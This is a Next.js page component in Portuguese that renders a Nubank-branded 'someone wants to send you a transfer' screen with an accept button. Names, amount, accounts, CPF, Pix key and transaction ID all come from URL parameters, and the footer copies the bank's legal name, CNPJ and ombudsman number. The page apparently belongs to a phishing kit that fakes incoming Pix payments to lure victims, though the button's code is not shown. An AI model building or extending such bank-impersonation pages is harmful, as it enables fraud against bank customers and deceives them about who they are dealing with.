import { Card } from '../../components/ui/card'
import { AceitarTransferenciaButton } from '../../components/AceitarTransferenciaButton'
import { AddIcon } from '@/icons'
import { formatToBRL, getFirstName, getRelativeTimeLabel, maskCPF } from '@/helpers'
import { SearchParams } from 'next/dist/server/request/search-params'
import { useCallback } from 'react'

export async function generateMetadata({ searchParams }: { searchParams: SearchParams }) {
  const origemNome = ((await searchParams)['origem_nome'] as string) || 'Maria Luiza Marques Salles'
  const destinoNome = ((await searchParams)['destino_nome'] as string) || 'Mirella'
  const firstName = getFirstName(origemNome)
  return {
    title: `Nubank - ${firstName} quer enviar uma transferência para você`,
    description: `Aceite a transferência de forma rápida e segura do ${firstName} através da Nubank!`,
  }
}

// Helper para converter string de horário para Date no fuso de Brasília
function parseHorarioToDate(horario: string, referencia: Date): Date {
  const match = horario.match(/^(\d{1,2})[:h](\d{2})$/)
  if (!match) throw new Error('Formato de horário inválido')
  const [_, h, m] = match
  // Cria uma data no mesmo dia da referência, mas com hora/minuto desejados
  const date = new Date(referencia)
  date.setHours(Number(h), Number(m), 0, 0)
  return date
}

export default async function Comprovante({ searchParams }: { searchParams: SearchParams }) {
  const params = searchParams
  // Captura dos parâmetros
  const valor = (params['valor'] as string) || '492,00'
  const pixKey = (params['pix'] as string) || '11978452751'
  const formattedAmount = formatToBRL(Number(valor) || 492)
  const horario = (params['horario'] as string) || '15:19'

  // Sempre calcula o label no server-side SOMENTE se houver referência de data/hora
  let horarioLabel: string | null = null
  if (params['referencia'] || params['data'] || params['data_hora']) {
    const referencia =
      (params['referencia'] as string) ||
      (params['data'] as string) ||
      (params['data_hora'] as string)
    const refDate = new Date(referencia)
    const horarioDate = parseHorarioToDate(horario, refDate)
    horarioLabel = getRelativeTimeLabel(horarioDate, refDate)
  }

  // Origem
  const origemNome = (params['origem_nome'] as string) || 'Maria Luiza Marques Salles'
  const origemInstituicao = (params['origem_instituicao'] as string) || 'NU PAGAMENTOS - IP'
  const origemAgencia = (params['origem_agencia'] as string) || '0001'
  const origemConta = (params['origem_conta'] as string) || '55362458-2'
  const origemCpf = maskCPF((params['origem_cpf'] as string) || '123.452.168-12')

  // Destino
  const destinoNome = (params['destino_nome'] as string) || 'Mirella'
  const destinoInstituicao = (params['destino_instituicao'] as string) || 'NU PAGAMENTOS - IP'
  const destinoAgencia = (params['destino_agencia'] as string) || '0001'
  const destinoConta = (params['destino_conta'] as string) || '55362458-2'
  const destinoCpf = maskCPF((params['destino_cpf'] as string) || '123.452.168-12')
  const destinoFirstName = getFirstName(destinoNome).toUpperCase()
  const firstName = getFirstName(origemNome).toUpperCase()

  // ID transação
  const transacaoId = (params['transacao_id'] as string) || 'E18326120202302270004a12b2d410b2'

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-white p-4">
      <div className="w-full max-w-lg">
        <div className="flex flex-col items-center mb-4">
          <img
            src="/flight-money.png"
            alt="Comprovante de transferência"
            className="w-24 h-24 mb-4 object-contain"
          />
          <h1 className="text-2xl font-bold text-center mb-2">
            {firstName} quer realizar uma transferência para você
          </h1>
        </div>

        {/* Card estilo ticket */}
        <div className="relative my-4 flex justify-center overflow-hidden">
          {/* Semicírculo esquerdo */}
          <div className="absolute left-0 top-1/2 translate-y-5 -translate-x-1/2 w-6 h-6 bg-white rounded-full border border-gray-200 z-10"></div>
          {/* Semicírculo direito */}
          <div className="absolute right-0 top-1/2 translate-y-5 translate-x-1/2 w-6 h-6 bg-white rounded-full border border-gray-200 z-10"></div>
          <div className="border border-gray-200 rounded-lg w-full max-w-lg bg-white shadow-sm overflow-hidden">
            <div className="p-6 flex flex-col items-center pb-2">
              <span className="text-3xl font-bold text-gray-900 mb-2">{formattedAmount}</span>
              <span className="text-lg text-gray-700 mb-1">para {destinoFirstName}</span>
              <span className="text-sm text-gray-400 mb-2">
                {horarioLabel ? `${horarioLabel} • ${horario}` : horario}
              </span>
            </div>
            {/* Linha tracejada */}
            <div className="w-full border-t border-dashed border-gray-300"></div>
            <div className="p-4 px-6 flex flex-col items-center">
              <AceitarTransferenciaButton />
            </div>
          </div>
        </div>
        {/* Fim card estilo ticket */}
        <Card className="mb-4 p-4">
          <div className="flex items-center mb-2">
            <img
              src="/send-money.png"
              alt="Ícone de envio de dinheiro"
              className="w-5 h-5 mr-2"
            />
            <span className="font-semibold">Origem</span>
          </div>
          <div className="text-sm text-gray-700 grid grid-cols-2 gap-y-2 gap-x-4">
            <span className="font-medium">Nome</span>
            <span>{origemNome}</span>
            <span className="font-medium">Instituição</span>
            <span>{origemInstituicao}</span>
            <span className="font-medium">Agência</span>
            <span>{origemAgencia}</span>
            <span className="font-medium">Conta</span>
            <span>{origemConta}</span>
            <span className="font-medium">CPF</span>
            <span>{origemCpf}</span>
          </div>
        </Card>
        <Card className="mb-4 p-4">
          <div className="flex items-center mb-2">
            <img
              src="/send-money.png"
              alt="Ícone de recebimento de dinheiro"
              className="w-5 h-5 mr-2 rotate-180"
            />
            <span className="font-semibold">Destino</span>
          </div>
          <div className="text-sm text-gray-700 grid grid-cols-2 gap-y-2 gap-x-4">
            <span className="font-medium">Nome</span>
            <span>{destinoNome}</span>
            <span className="font-medium">Instituição</span>
            <span>{destinoInstituicao}</span>
            <span className="font-medium">Agência</span>
            <span>{destinoAgencia}</span>
            <span className="font-medium">Conta</span>
            <span>{destinoConta}</span>
            <span className="font-medium">CPF</span>
            <span>{destinoCpf}</span>
            <span className="font-medium">Chave pix</span>
            <span>{pixKey}</span>
          </div>
        </Card>
      </div>
      {/* Rodapé comprovante */}
      <div className="w-full max-w-lg mx-auto mt-8 text-xs text-gray-800">
        <div className="mb-1 font-semibold">Nu Pagamentos S.A. - Instituição de Pagamento</div>
        <div className="mb-2">CNPJ 18.236.120/0001-58</div>
        <div className="mb-1 font-semibold">ID da transação: {transacaoId}</div>
        <div className="mb-0.5">Estamos aqui para ajudar se você tiver alguma dúvida</div>
        <div>
          Ouvidoria: 0800 887 0463, atendimento em dias úteis, das 09h às 18h (horário de São
          Paulo).
        </div>
      </div>
      {/* Fim rodapé comprovante */}
    </div>
  )
}
